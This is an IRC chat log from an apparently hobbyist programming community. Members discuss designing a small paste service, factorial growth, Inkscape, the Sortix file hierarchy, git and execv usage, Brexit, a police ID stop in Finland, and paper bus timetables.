Jul 16 20:52:52 <shikhin>	I said it in here. That's the only way it's linked to me.
Jul 16 20:54:36 <zgrep>	But I can feed the paste to archive.is, and now it's linked to you forever?
Jul 16 20:54:50 <shikhin>	No, because it didn't have my name on it.
Jul 16 20:55:09 <zgrep>	<shikhin> I said it in here. That's the only way it's linked to me. <-- Then this is false because it's not linked to you.
Jul 16 20:55:26 <shikhin>	The URL is linked to me because I shared it here. If you archived the URL, well, yes, I'm out of luck.
Jul 16 20:55:34 <shikhin>	That doesn't mean you give up on trying to maintain separation of pastes.
Jul 16 20:55:39 <zgrep>	Hm.
Jul 16 20:55:50 <shikhin>	Bad things can happen, but that doesn't mean you /let/ them.
Jul 16 20:56:01 <S_Gautam>	What happened
Jul 16 20:56:13 <S_Gautam>	did zgrep lead a non-member into the secret offtopia server
Jul 16 20:56:17 *	shikhin blinks.
Jul 16 20:56:37 *	S_Gautam blinks back.
Jul 16 20:56:39 <zgrep>	shikhin: T-the entire point was to *not* separate the pastes... ._.
Jul 16 20:56:50 <shikhin>	Huh?
Jul 16 20:57:07 <zgrep>	I mean, if I'm hashing them, I'm doing that so as to be able to keep them together.
Jul 16 20:57:24 <shikhin>	Yes. I don't want you to do that. I want you to maintain separate pastes. That's what I said.
Jul 16 20:57:54 <zgrep>	Mmh. Oky.
Jul 16 20:57:55 <zgrep>	+a
Jul 16 20:58:43 <shikhin>	S_Gautam: There's only one "offtopia server"-ish, by the way, and that's roughly owned and operated by zgrep...
Jul 16 20:59:59 <zgrep>	shikhin: I wouldn't say I operate it anymore.
Jul 16 21:00:10 *	zgrep . o O ( I cooperate it. )
Jul 16 21:00:13 <shikhin>	Hehe.
Jul 16 21:00:27 <zgrep>	<shikhin> As am I. I thought you wanted the pastes for "test" to be the same always. <-- The things I said before this, I was assuming we had already decided that paste id's should be chosen randomly. :P
Jul 16 21:00:47 <S_Gautam>	It seems like someone messed up shikhin's pastes?
Jul 16 21:00:48 *	shikhin blinks.
Jul 16 21:00:57 <shikhin>	I am confused. Do you want paste id's to be deterministic or not?
Jul 16 21:01:04 <shikhin>	s/'//s
Jul 16 21:01:04 <bslsk05>	​<shikhin*> I am confused. Do you want paste ids to be deterministic or not?
Jul 16 21:02:29 <shikhin>	S_Gautam: Just, er, read the bloody backlog.
Jul 16 21:02:51 <zgrep>	shikhin: Gaah. I said that I didn't understand the point of the hashes if they weren't being used for determism, and offered up: "why not use random things?". You said "don't ask me, ask nanovad". I then proceeded to assume our conversation assumed that paste ids were random, until I realised you were trying to convince me that deterministic paste ids are bad. Then it took you a while to convince me that they are, indeed, bad. :P
Jul 16 21:03:13 <CompanionCube>	hm
Jul 16 21:03:17 <nanovad>	hi I'm nanovad
Jul 16 21:03:23 <nanovad>	I propose we have a single paste ID
Jul 16 21:03:26 <zgrep>	:D
Jul 16 21:03:33 <CompanionCube>	i wonder how good/bad rhodecode's pastes are
Jul 16 21:03:44 <CompanionCube>	or kallithea's
Jul 16 21:03:54 <CompanionCube>	maybe we can steal their code
Jul 16 21:05:57 <shikhin>	nanovad: :D:
Jul 16 21:06:02 <shikhin>	zgrep: That was a bad conversation.
Jul 16 21:06:06 <CompanionCube>	no encryption pbviusly
Jul 16 21:06:45 <shikhin>	But yay, good, we all convinced nanovad to use random IDs and do encryption. This is good news.
Jul 16 21:07:06 <zgrep>	I... what?
Jul 16 21:07:12 <zgrep>	I agree with the former, when did the latter happen?
Jul 16 21:07:20 <shikhin>	Just now.
Jul 16 21:07:26 <zgrep>	:D:
Jul 16 21:07:56 *	zgrep doesn't see how encryption can happen securely, but *shrug*.
Jul 16 21:08:01 <CompanionCube>	also
Jul 16 21:08:07 <CompanionCube>	when hashing pastes
Jul 16 21:08:21 <CompanionCube>	why not incluce the damn metadata in the hash
Jul 16 21:08:37 <nanovad>	what's a security
Jul 16 21:08:41 <nanovad>	help what's a server
Jul 16 21:08:45 <zgrep>	CompanionCube: Haha.
Jul 16 21:09:06 <zgrep>	nanovad: It sits around all night on its 5 tails, and howls during the evening.
Jul 16 21:09:07 <CompanionCube>	that way you can only take over pastes that are not only the same content
Jul 16 21:09:25 <zgrep>	CompanionCube: Hrm. That could still "extend" a paste.
Jul 16 21:09:28 <CompanionCube>	but also have the same highlighting and expiry and maybe encryption flag
Jul 16 21:09:34 <shikhin>	Sure, I'm with that--but then metadata should be color + expiry *date* + encryption.
Jul 16 21:09:45 <shikhin>	In which case it's just about equivalent to random, isn't it?
Jul 16 21:09:51 <shikhin>	s/date/time/
Jul 16 21:09:51 <bslsk05>	​<shikhin*> Sure, I'm with that--but then metadata should be color + expiry *time* + encryption.
Jul 16 21:10:12 <CompanionCube>	shikhin: time'd be a good value to use
Jul 16 21:10:13 <shikhin>	zgrep: Ah, I don't know--I'm sure it's possible, but even if it ends up being insecure... well, hopefully no one on ahti will cross that hurdle to snoop on the pastes.
Jul 16 21:10:33 <zgrep>	shikhin: Err, then you can make pastes (effectively) never expire.
Jul 16 21:10:42 <shikhin>	How so?
Jul 16 21:10:54 <zgrep>	I make it expire in 12-31-9999.
Jul 16 21:10:55 <zgrep>	Err.
Jul 16 21:10:58 <zgrep>	31-12-9999.
Jul 16 21:10:58 <shikhin>	Erm.
Jul 16 21:11:09 <shikhin>	No, the server converts your "time to expire" to "expiry timestamp".
Jul 16 21:11:22 <zgrep>	Err, you said "expiry *date*".
Jul 16 21:11:39 <shikhin>	Then I fixed it to time because I thought that'd be ambiguous.
Jul 16 21:12:00 <shikhin>	(But turns out that was ambiguous as well, hence the above two messages.)
Jul 16 21:12:34 <nanovad>	to anyone who finds any issues with the paste script: https://twitter.com/sadserver/status/1016825605050863616
Jul 16 21:12:35 <bslsk05>	​twitter: <sadserver> NOTE: Vulnerabilities will only be taken seriously if they are disclosed with an accompanying website, logo, and twitter persona.
Jul 16 21:13:23 <shikhin>	As for encryption, I wouldn't know--I know nortti did encryption on their paste service, maybe they could quickly explain how that worked.
Jul 16 21:16:44 <zgrep>	Ah, hm. Possible.
Jul 16 21:17:39 <zgrep>	As for encryption, the only way it can be secure is if you trust all of your root SSL certs, and Let's Encrypt, and ahti. 
Jul 16 21:17:54 <shikhin>	Don't we?
Jul 16 21:17:59 <zgrep>	And, uh, don't accidentally use HTTP.
Jul 16 21:18:22 <zgrep>	If we do, then we can do it in JS without problems.
Jul 16 21:18:48 <shikhin>	"It is possible to do it securely" is what I'm hearing.
Jul 16 21:19:07 <zgrep>	Err, if you trust all those. And that's not always a safe bet.
Jul 16 21:19:42 <zgrep>	Personally, I don't trust all the root CA's in my system. I use them anyway, though, because I sort-of don't care.
Jul 16 21:19:45 <shikhin>	As opposed to not having any encryption?

Jul 17 06:49:32 <john_cephalopoda>	Hmm, fac(n) is non-polynomial. It even grows bigger than 2^n since that only gets twice as big every step while fac(n) gets at least n times as big in every step.
Jul 17 06:50:38 <S_Gautam>	Which grows faster x! Or x^x
Jul 17 06:51:15 <john_cephalopoda>	fac(x) is an other notation for x!
Jul 17 06:51:23 <S_Gautam>	I know
Jul 17 06:52:04 <john_cephalopoda>	So fac(n) doesn't grow faster than n!, it grows with the exact same speed.
Jul 17 06:52:27 <S_Gautam>	Err I asked x! And x^x bro
Jul 17 06:52:34 <S_Gautam>	x^x it seems

Jul 17 06:52:56 <john_cephalopoda>	Also x^x looks like it grows faster than fac.
Jul 17 06:53:03 <S_Gautam>	Yeah
Jul 17 06:53:14 <john_cephalopoda>	Ah, sorry, I misread your sentence.
Jul 17 06:53:50 <john_cephalopoda>	Yeah, x^x gets bigger by at least x+1 every step.
Jul 17 06:54:21 <john_cephalopoda>	The next step is (x
Jul 17 06:54:29 <john_cephalopoda>	(x+1)^(x+1).
Jul 17 06:54:34 <rain1>	x^x is larger than x! but they grow at the same speed don't they?

Jul 17 06:56:15 <rain1>	same number of terms in each
Jul 17 06:57:00 <rain1>	stirlings approximation gives a term  (x/e)^x
Jul 17 06:57:36 <rain1>	alright I guess x^x is slightly larger
Jul 17 06:58:20 <S_Gautam>	There doesn't exist a friendly derivative for x! does it
Jul 17 06:58:57 <rain1>	perhaps eulers gamma function has a nice derivative

Jul 17 10:05:47 <nanovad>	Alright, what languages should be on there?
Jul 17 10:05:55 <hydraz>	uhh
Jul 17 10:06:17 <heat>	C
Jul 17 10:06:19 <heat>	C++
Jul 17 10:06:23 <heat>	Java
Jul 17 10:06:25 <hydraz>	let's see: Python, C, C++ (if those are separate), some Lisp
Jul 17 10:06:27 <nanovad>	I'm thinking C/++, Haskell, Python, C#, Java, maybe some others
Jul 17 10:06:28 <nanovad>	Lisp too yeah
Jul 17 10:06:32 <hydraz>	I know I'll use Lua, Haskell and OCaml personally
Jul 17 10:06:36 <nanovad>	ooh, Lua, yeah
Jul 17 10:06:52 <heat>	HTML?
Jul 17 10:06:58 <nanovad>	hmm
Jul 17 10:07:00 <nanovad>	sure
Jul 17 10:07:14 <hydraz>	oh, JS
Jul 17 10:08:17 <heat>	systemd unit files :>

Jul 17 10:08:43 <hydraz>	vimscript
Jul 17 10:09:10 <john_cephalopoda>	nortti: It is possible. You have to enable snap.
Jul 17 10:09:11 <nanovad>	mmm
Jul 17 10:09:16 <nanovad>	We'll let auto do that
Jul 17 10:09:36 <hydraz>	:D:
Jul 17 10:10:13 <olsner>	maybe have two lists, one for common languages, one with all of them, any languages actually used from the second list get added to the first list
Jul 17 10:11:05 <john_cephalopoda>	nortti: It's in Edit -> Preferences -> Behavior -> Snapping.
Jul 17 10:11:09 <nortti>	ah, thanks
Jul 17 10:11:15 <nanovad>	olsner: ehh
Jul 17 10:11:25 <john_cephalopoda>	nortti: The thing is called "Enable Snap Operator".

Jul 17 10:14:45 <nanovad>	heh
Jul 17 10:14:53 <SquidDev>	nanovad: I've been instructed to ask you whether p.ahti.space is pronounced "patty space" or something else.
Jul 17 10:14:59 <heat>	(sortix doesn't have /usr for the record)
Jul 17 10:15:09 <SquidDev>	^ hydraz: Better?
Jul 17 10:15:12 <hydraz>	ahh, they're onto me D:
Jul 17 10:15:23 <john_cephalopoda>	heat: glibc.
Jul 17 10:15:30 <nanovad>	SquidDev: potty space :P
Jul 17 10:15:49 <olsner>	nanovad: is that supposed to work? I tried submitting something and it resulted in https://ahti.space/410fba.html saying "not found"
Jul 17 10:15:49 <bslsk05>	​ahti.space: text/plain; charset=utf-8 [9 bytes]
Jul 17 10:16:10 <nortti>	john_cephalopoda: can you do operations like "split this circle along this line segment"?
Jul 17 10:16:11 <nanovad>	olsner: nah, just a dummy page for the dropdown
Jul 17 10:16:11 <heat>	SquidDev: It's pronounced "p.ahti.space"
Jul 17 10:16:18 <nanovad>	it's pronounced normally
Jul 17 10:16:31 <SquidDev>	OK, I'm very confused how ahti is "-otty", but OK I guess.
Jul 17 10:16:40 <hydraz>	nanovad: sortie? is that you?
Jul 17 10:16:57 <nanovad>	:)
Jul 17 10:17:01 <SquidDev>	At least I know how to read it now, rather than whatever garbled mess I did before :).
Jul 17 10:17:07 <nortti>	SquidDev: ahti is [ˈɑçti]
Jul 17 10:17:19 <hydraz>	nanovad: looks good wrt landing page
Jul 17 10:17:55 <hydraz>	nortti: d-does English have ç?
Jul 17 10:18:02 <john_cephalopoda>	nortti: You can kinda do that.
Jul 17 10:18:16 <nortti>	hydraz: no. who said it was english?
Jul 17 10:18:24 <hydraz>	that's the only language Squid knows
Jul 17 10:18:25 <nanovad>	I should record myself saying ahti
Jul 17 10:18:32 <nanovad>	at least, how I think of it in my head
Jul 17 10:18:32 <john_cephalopoda>	nortti: Double-click on that circle and drag around the circular markers.
Jul 17 10:18:55 <nortti>	oh, useful
Jul 17 10:19:03 <john_cephalopoda>	nortti: That way you can create unclosed arcs or closed pie pieces.
Jul 17 10:19:23 <john_cephalopoda>	(Can be toggled in the top bar)
Jul 17 10:20:34 <SquidDev>	hydraz: I know two words of German. But point taken :/.
Jul 17 10:20:42 <hydraz>	do you know the word 'nicht'?
Jul 17 10:20:53 <SquidDev>	Nein.
Jul 17 10:22:11 <sprocklem>	Some dialects of english have /hj/ (like in hue) as [ç]
Jul 17 10:23:02 <nortti>	actually, I guess it's more [ˈɑχti] really
Jul 17 10:23:22 <nortti>	john_cephalopoda: is there a way to split a line segment into two segments at a point?
Jul 17 10:24:15 <nanovad>	nortti: on ahti, you'd use apk to install python libs where possible, yes?
Jul 17 10:24:21 <nortti>	yeah
Jul 17 10:24:24 <nanovad>	alright
Jul 17 10:24:27 <sortie>	<heat> (sortix doesn't have /usr for the record)
Jul 17 10:24:27 <nortti>	why?
Jul 17 10:24:29 <hydraz>	nortti: is that like the ch in loch?
Jul 17 10:24:33 <sortie>	heat: Wrong. Sortix has /usr.
Jul 17 10:24:47 <nortti>	hydraz: yeah, except farther back in the throat
Jul 17 10:25:01 <hydraz>	oh, that is a sound I know how to make, actually
Jul 17 10:25:02 <sortie>	Doesn't every system have /usr be a symlink to ‘.’? I mean, why have both /bin and /usr/bin? Surely systems are not that far out.
Jul 17 10:25:38 <hydraz>	sortie: I don't have /usr/bin *or* /bin, where's your god now?
Jul 17 10:25:38 <sprocklem>	No
Jul 17 10:26:01 <sprocklem>	sortie: Many do have those split, or just symlink those two directories
Jul 17 10:26:29 <sortie>	sprocklem: What really??! Who would have both, that's just crazy.
Jul 17 10:26:48 <heat>	sortie: Ah right, /usr was a symlink to / right?
Jul 17 10:26:59 <hydraz>	/usr/root/
Jul 17 10:27:28 <sortie>	heat: /usr is a symlink to .
Jul 17 10:27:42 <hydraz>	/usr/a.out
Jul 17 10:28:34 <sprocklem>	sortie: Most linux systems have those split for some reason
Jul 17 10:28:42 <sortie>	hydraz: Your god is hier(7) <https://sortix.org/man/man7/hier.7.html>, now bow!
Jul 17 10:28:42 <bslsk05>	​sortix.org: hier(7)
Jul 17 10:28:43 <sprocklem>	(Or at least used to)
Jul 17 10:28:45 <john_cephalopoda>	nortti: Yes, double-click on the line where you want to split it.
Jul 17 10:28:52 <john_cephalopoda>	nortti: * triple click
Jul 17 10:29:02 <john_cephalopoda>	nortti: * double-click twice
Jul 17 10:29:06 <sprocklem>	(Idk, I've been using Arch for years which has them merged)
Jul 17 10:29:33 <heat>	/lib and /bin as symlinks to /usr/lib and /lib/bin is the superior alternative
Jul 17 10:29:40 <heat>	*/usr/bin
Jul 17 10:29:59 <sortie>	heat: That's just crazy talk
Jul 17 10:30:08 <sortie>	How is that superior? It's more complex and weird.
Jul 17 10:30:17 <heat>	exactly
Jul 17 10:30:25 <heat>	superior
Jul 17 10:30:44 <sortie>	There's users of Sortix... and then there are usrs.
Jul 17 10:32:02 <heat>	not symlink /bin and /lib is like not mounting tmpfs in /dev
Jul 17 10:32:07 <heat>	*symlinking
Jul 17 10:32:45 <heat>	just pure heresy
Jul 17 10:33:10 <nortti>	john_cephalopoda: hm, how do I make inscape only save (as .svg) the drawing? there's an option for it when I export, but can't see one for saving

Jul 17 10:56:23 <hydraz>	https://ahti.space/~nanovad/paste/25b1bf.html apparently it couldn't settle on a language

Jul 17 10:57:30 <hydraz>	eh, as expected
Jul 17 10:57:33 <nanovad>	What language is that anyway, hydraz?
Jul 17 10:57:58 <hydraz>	Amulet! I'm not sure it counts as valid OCaml, but that's the closest approximation.
Jul 17 10:58:39 <nanovad>	ahh
Jul 17 10:59:12 <hydraz>	of course, the OCaml highlighter decided both occurences of 'int' are built-in types
Jul 17 10:59:38 <heat>	https://ahti.space/~nanovad/paste/534449c.html
Jul 17 10:59:39 <heat>	same
Jul 17 10:59:40 <bslsk05>	​ahti.space <no title>
Jul 17 10:59:40 <nanovad>	looks like it also escapes the HTML when highlighting
Jul 17 10:59:42 <nanovad>	which is nice
Jul 17 11:00:08 <nanovad>	hm yeah
Jul 17 11:00:18 <hydraz>	(OCaml also allows `let int : int = 3`, apparently)
Jul 17 11:00:32 <heat>	although gcc extensions aren't supported by the highlighter it seems
Jul 17 11:00:44 <nanovad>	\:D/

Jul 17 12:01:56 <sortie>	What do you mean by that?
Jul 17 12:02:09 <heat>	does tty_write lock a mutex?
Jul 17 12:02:09 <bslsk05>	​<heat> does titty_write lock a mutex?
Jul 17 12:02:35 <sortie>	puckipedia you lewd
Jul 17 12:02:53 <heat>	like a write mutex to keep writes in sync(so you don't get issues between 2 writes at the same time)
Jul 17 12:03:18 <sortie>	heat: The kernel obviously has a lock in every write() implementation, whether titty or file, to protect itself
Jul 17 12:03:38 <heat>	err, it does?
Jul 17 12:03:45 <heat>	fuck i've been doing it wrong
Jul 17 12:03:45 <sortie>	Of course
Jul 17 12:03:58 <sortie>	heat: I mean, /dev/null doesn't for instance.
Jul 17 12:04:14 <sortie>	heat: But the part where multiple threads might act on the same memory? There's a lock.
Jul 17 12:05:17 <sortie>	heat: There may be some situations where two writes might interleave
Jul 17 12:06:17 <SquidDev>	It really didn't like Amulet: https://ahti.space/~nanovad/paste/ffe1bc.html

Jul 17 12:07:07 <heat>	sortie: Right, and that's what file locks are for?
Jul 17 12:07:27 <nanovad>	SquidDev: . o O ( upstreaming a lexer/highlighter for it )
Jul 17 12:07:46 <sortie>	nortti: It can happen if the write() is implemented with a loop where it does as much as IO as it cans, and the write doesn't return early, but instead waits until the file before ready. But another thread might win that. I'm not sure if this actually happens anywhere. It may be a bug.
Jul 17 12:07:49 <sortie>	Err heat
Jul 17 12:08:05 <SquidDev>	nanovad: Aside from some missing `in`s and `;;`s, it's pretty much OCaml. I'm not sure what it thought it was though
Jul 17 12:08:09 <sortie>	heat: There's also some questions about writev's atomicity. It's not always in Sortix if the device doesn't natively support it.
Jul 17 12:10:43 <john_cephalopoda>	nortti: You go to File -> Save. There you can choose the file type that you want to save as. Choose "Plain SVG (*.svg)"
Jul 17 12:12:00 <john_cephalopoda>	nortti: You can also use "Optimized SVG". I guess it will make the file smaller.
Jul 17 12:12:48 *	nanovad considers installing KDE alongside his XMonad installation

Jul 17 12:13:40 <sortie>	heat: Unclear about all that stuff
Jul 17 12:13:45 <sortie>	You can look for an existing bug or open one

Jul 17 12:24:01 <zgrep>	(ahti has dirlisting on by default)

Jul 17 12:27:02 <zgrep>	Ah.

Jul 17 12:27:18 <zgrep>	W-why is highlighting not an on-demand thing?
Jul 17 12:27:31 <hydraz>	what?
Jul 17 12:27:49 <zgrep>	(similar to how, uh, sprunge.us had it, for example)
Jul 17 12:28:02 <hydraz>	do you mean defaulting to plain would be better than defaulting to automatic, or..?
Jul 17 12:28:19 <nanovad>	or "view this highlighted as {x}"?
Jul 17 12:28:38 <zgrep>	I mean, assume plain unless specified otherwise.
Jul 17 12:28:56 <hydraz>	nanovad: do you think you could include the detected language in the title?
Jul 17 12:29:01 <nanovad>	heat: I think it's more a problem with your chromium, tbh. I'm using FF 61 and it's fine

Jul 17 12:31:20 <heat>	more specifically, im running 67.0.3396.99
Jul 17 12:31:23 <john_cephalopoda>	Imo it would make sense to remove pastes after 1 to 3 months.
Jul 17 12:31:40 *	nanovad sighs
Jul 17 12:31:43 <heat>	add an option
Jul 17 12:31:44 <nanovad>	y'all want to implement this
Jul 17 12:31:47 <nanovad>	because I don't
Jul 17 12:31:49 <nanovad>	:P
Jul 17 12:32:06 <john_cephalopoda>	nanovad: cronjob?
Jul 17 12:32:14 <nanovad>	john_cephalopoda: how do you know how long the paste should stick around for?
Jul 17 12:32:31 <nanovad>	Maybe some people want their pastes removed sooner, or later.
Jul 17 12:32:37 <john_cephalopoda>	nanovad: It should just default to 3 months. If you want something pasted longer, you should use gist.
Jul 17 12:32:56 <heat>	nanovad: add data in the file name?
Jul 17 12:33:07 <heat>	like random-id-6mo or something
Jul 17 12:33:22 <heat>	or put them in specific dirs
Jul 17 12:33:26 <hydraz>	heat: I'm on 67.0.3396.87
Jul 17 12:33:27 <john_cephalopoda>	A delete URL would work.
Jul 17 12:33:33 <nanovad>	heat: then you'd have to give the path
Jul 17 12:33:37 <nanovad>	When sharing it, I mean
Jul 17 12:34:27 <john_cephalopoda>	Generate a delete URL that is hashed from post parameters known to the server, delete the respective file when the URL is entered.
Jul 17 12:35:04 <heat>	are you going to remember to delete the pastes?
Jul 17 12:35:20 <heat>	do you trust the user to delete the pastes?
Jul 17 12:35:22 <hydraz>	probably not, but that's on you :p
Jul 17 12:37:01 <nanovad>	I think if we want all these features we should probably just bite the bullet, install some deps, and use an actual paste system
Jul 17 12:37:24 <hydraz>	i like nanopaste, it was invented here
Jul 17 12:38:16 <nanovad>	heh
Jul 17 12:38:28 *	nanovad . o O ( NIH just means glitchier )
Jul 17 12:38:43 <heat>	why not just gist?
Jul 17 12:39:13 <heat>	or some other paste system
Jul 17 12:39:21 *	nanovad . o O ( gitlab snippets )
Jul 17 12:39:27 <heat>	ew gitlab
Jul 17 12:39:39 <nanovad>	heat: gitlab or gtfo
Jul 17 12:39:43 <heat>	but muh github
Jul 17 12:39:46 <nanovad>	ew
Jul 17 12:40:50 <hydraz>	length "gist.github.com" > length "p.ahti.space"
Jul 17 12:41:08 <nanovad>	:D:
Jul 17 12:41:08 <heat>	goo.gl
Jul 17 12:41:26 <hydraz>	that's another step!
Jul 17 12:41:56 <nanovad>	also, they're shutting that down
Jul 17 12:42:01 <heat>	that's why there's a plugin
Jul 17 12:42:03 <heat>	what??
Jul 17 12:42:07 <john_cephalopoda>	heat: The delete link is for premature deleting. Else it will delete after 3 months.
Jul 17 12:42:10 <nanovad>	See the message on the homepage
Jul 17 12:42:13 <heat>	oh crap
Jul 17 12:42:21 <nanovad>	(why the title doesn't use it anymore)

Jul 17 12:46:45 <john_cephalopoda>	It is a TV spot from Soviet Russia from the year that a book is named after, hosted on a website of one of the biggest corporations in the world, which knows everything about you and collects all your data, like the party in said book.
Jul 17 12:49:44 <hydraz>	haha, it's almost like 1984 was a normal year
Jul 17 12:49:50 <heat>	Good video comrade👍👍👍﻿
Jul 17 12:49:59 <heat>	I knew it

Jul 17 13:04:19 <CompanionCube>	I approve of this hierachy. it is good.

Jul 17 13:14:42 <nanovad>	That's what Pygments supports, not sure about any other shells

Jul 17 13:14:59 <nanovad>	oop
Jul 17 13:15:09 <nanovad>	yeah I guess that does sound silly
Jul 17 13:17:18 <nanovad>	okay, that should work

Jul 17 14:55:47 <SquidDev>	Oh, and disable load* methods.
Jul 17 14:56:55 <SquidDev>	And then use nice/cgroups/something in order to prevent abuse.

Jul 18 04:58:19 <john_cephalopoda>	Instead of saying "Country X is safe, we will send people from there home without big tests", they should say: "Country Y is unsafe, we take everybody from there without checking if we should send them back, for country X we perform the usual checks".

Jul 20 10:44:51 <olsner>	the nuke reverts back to the bare file system before cloning or creating the repo :)
Jul 20 10:45:14 <john_cephalopoda>	The only solution that worked for me is resetting hard, then branching to a tmp branch, deleting the old branch, fetching the branch from origin again, moving into the branch, deleting the tmp branch, done.
Jul 20 10:45:15 <nortti>	john_cephalopoda: iirc pull is literally just fetch & merge
Jul 20 10:45:31 <olsner>	ah, that's dumb, you need to fix the build system if it's going around modifying stuff
Jul 20 10:46:00 <john_cephalopoda>	It's some GL stuff, probably auto-generated parts.
Jul 20 10:48:44 <olsner>	you might want `git reset --hard @{u}` then - @{u} is an alias for the current branch's upstream branch, e.g. origin/master when you're on master
Jul 20 10:51:39 <olsner>	(at least that's what I gather your dance with reset/branch/fetch/checkout/delete ends up being equivalent to)
Jul 20 10:52:04 <john_cephalopoda>	Might work. I'll test it next time I need it.

Jul 20 13:36:00 <shikhin>	I think having separate screens, extra inputs, and input devices qualifies you to make your own store.

Jul 21 02:38:41 <shikhin>	I don't know! But this certainly doesn't seem like a characteristic of a great model.
Jul 21 02:42:19 <john_cephalopoda>	It's the best existing model that I know of.
Jul 21 02:42:25 <john_cephalopoda>	And it works reasonably well.
Jul 21 02:43:49 <shikhin>	Didn't one of the most important members of the EU very recently decide to leave it, causing lots of people to panic about what'll happen now?
Jul 21 02:45:29 <john_cephalopoda>	To be honest, the people who panic most about it are the ones that try to leave.
Jul 21 02:46:58 <john_cephalopoda>	Look at their politics right now. Ministers swapping faster that you can look, failed attempts to get a good Brexit deal, loud thoughts to cancel it all and just stay in, ...
Jul 21 02:47:53 <john_cephalopoda>	Losing GB will be inconvenient in the EU. Money will be lost. But the ones who will suffer most is GB.
Jul 21 02:48:51 <john_cephalopoda>	London is the center of European banking. Many banks decided to move to Paris or Frankfurt instead because they don't want to be on the wrong side of the wall after the Brexit.
Jul 21 02:49:00 <shikhin>	Mmm; just saying that "important members deciding to leave" also doesn't sound like the characteristic of a good model.
Jul 21 02:49:38 <john_cephalopoda>	The model is "You get free trade and good deals, you help when we need help in return". Britain doesn't want to accept that.
Jul 21 02:49:51 <john_cephalopoda>	They think the EU is too big, although they were the ones always pushing for extension.
Jul 21 02:50:26 <john_cephalopoda>	They want the benefits without the downsides. 
Jul 21 02:51:25 <shikhin>	Er.
Jul 21 02:51:30 <john_cephalopoda>	The idea appears to be that they will stay in the trade union but leave all other EU treaties that might be a burden.
Jul 21 02:51:52 <shikhin>	That's a lot of lines that don't address what I said, though/
Jul 21 02:53:47 <john_cephalopoda>	The model is good. From each according to his ability, to each according to his needs. Plus free trade. 
Jul 21 02:54:54 <shikhin>	Is that really the extent of the model, or does it involve a complicated possibly non-democratic way to impose lots of regulations on lots of countries?
Jul 21 03:00:05 <john_cephalopoda>	There are many reasons for the Brexit. I think that a big part of it is false propaganda spread by populists. Of course flaws in the model also contributed to it, but I don't think that it had a really big influence.
Jul 21 03:00:29 *	shikhin blinks.
Jul 21 03:01:02 <shikhin>	(I'm not really talking about Brexit; you just mentioned you think the EU is a "great model" and things like that should crop all over the world, and I'm curious why.)
Jul 21 03:01:20 <shikhin>	niht.
Jul 21 03:01:49 <john_cephalopoda>	shikhin: I just think that it's the best model and the adverse effects are way weaker than in other models that are implemented.
Jul 21 03:01:51 <john_cephalopoda>	shikhin: niht

Jul 21 05:44:14 <nortti>	well fucking guess who was stopped by police and threatened with jail time unless they gave their personal info to cops (who changed their story twice) when leaving pride
Jul 21 05:47:53 <nortti>	most annoyed that we didn't realize to record that thing
Jul 21 06:01:10 <asecretcat-web>	w-what
Jul 21 06:01:55 <asecretcat-web>	is there...some law that allows cops to arrest you if you don't immediately present your papers?
Jul 21 06:02:48 <nortti>	in finland, police is allowed to arrest and hold for at maximum four days (iirc) anyone they feel a threat to public order
Jul 21 06:03:11 <nortti>	no need for any suspicion of a crime
Jul 21 06:04:10 <asecretcat-web>	sigh
Jul 21 06:04:48 <nortti>	honestly, fucking arrest me, but I had on a piece of paper some personal info of a couple others, and had no way of contacting my parents that hey, police threw me in jail for not giving my ID
Jul 21 06:06:09 <nortti>	oh, I see. for not giving your ID they can hold you at max 24h
Jul 21 06:08:55 <nortti>	asecretcat-web: "<A policeman has the right to receive information from everyone about their name, personal ID number or lacking it their birthday and cizenship, as well as a place the person can be reached, in order to fulfill a singular job.>"
Jul 21 06:09:30 <nortti>	finnish police law 2011, chapter 2 section 1
Jul 21 06:21:10 <asecretcat-web>	so it is a papers law i guess
Jul 21 06:21:20 <asecretcat-web>	power tripping asses

Jul 21 06:24:35 <nortti>	they told us the information wasn't going to be stored anywhere, but refused to destroy or give us the piece of paper with the info on it after they had done their checks, so…
Jul 21 06:26:11 <nortti>	it's kinda like how when you're getting a passport, they take your fingerprint. if you ask, it's not going to be stored into any database, but god help you if you want that written down somewhere

Jul 21 06:27:33 <FireFly>	that's.. ow
Jul 21 06:30:13 <nortti>	my favourite thing is how the second story they used was they need our info to make sure we aren't nazis, since they had received reports of nazis going that way (they dropped that story when I asked them how can they know if we were members of that nazi org)
Jul 21 06:30:43 <nortti>	why? because earlier there had been two cops standing right by the nazis, doing fuck-all
Jul 21 06:31:13 <FireFly>	Didn't you know? ID cards have "nazi" written on them if you're a nazi
Jul 21 06:32:04 <nortti>	lol
Jul 21 06:32:17 <FireFly>	I guess they could in principle have had a list of names of members, but ...
Jul 21 06:32:45 <nortti>	yeah. they flat-out denied that kinda list existing when I asked

Jul 22 04:34:31 <olsner>	LPCSTR array[5] :P
Jul 22 04:35:25 <olsner>	"const char *array[5]" (the complicated variant is when you want a pointer to the array, then it's const char (*array)[5])
Jul 22 04:36:21 <nortti>	ah
Jul 22 04:37:34 <nortti>	oh fucking. now it complains that's not compatible with execv
Jul 22 04:38:04 <olsner>	oh, you want a const array of char pointers, not an array of const char pointers?
Jul 22 04:38:49 <olsner>	or array of const pointers to char, rather than array of pointers to const char
Jul 22 04:39:23 <nortti>	well, I have a const char* pointing to the file I want to execute. I want to pass it to execv as both the thing to execute as well as part of the argv
Jul 22 04:39:53 <olsner>	since the argument type is char *const argv[], you'd simply do char *const array[5] I think
Jul 22 04:40:36 <nortti>	well then it's complaining I'm putting a const char* thing there, bypassing the constness
Jul 22 04:41:02 <olsner>	hm, and cast the string to char* to remove the constness perhaps... seems weird if it'd actually be modifying the argument string

Jul 22 11:22:31 <FireFly>	That's... fascinating
Jul 22 11:22:56 <FireFly>	"Lena-Sophie Mueller, of the German nonprofit Initiative D21, pointed out: “Timetables (for railways) are no longer available in paper form. More and more services are based on the Internet and without access, those on the other side of the Internet are excluded from social participation.”"  yeah :\
Jul 22 11:23:17 <FireFly>	I wish we'd be less reliant on technology.
Jul 22 11:24:34 <FireFly>	another example would be shops (and bank offices) going cashless here
Jul 22 12:10:59 <nortti>	as someone who's had problems using phones, lack of paper time tables can be a real problem for me. fortunately, most (but not all) bus stops in oulu still have either a paper table or a screen displaying busses arriving soon
Jul 22 12:13:07 <nortti>	[nolog] I actually went and created some timetables on my own for a stop near here that lacks them. also thinking with a friend about bringing tables to two other stops lacking them, but they also lack the openable glass case where to put the tables
Jul 22 12:14:17 <FireFly>	The screen thing reminds me of this tweet from some time ago from Australia (IIRC), with e-ink displays showing upcoming busses
Jul 22 12:14:21 <FireFly>	which looked really neat
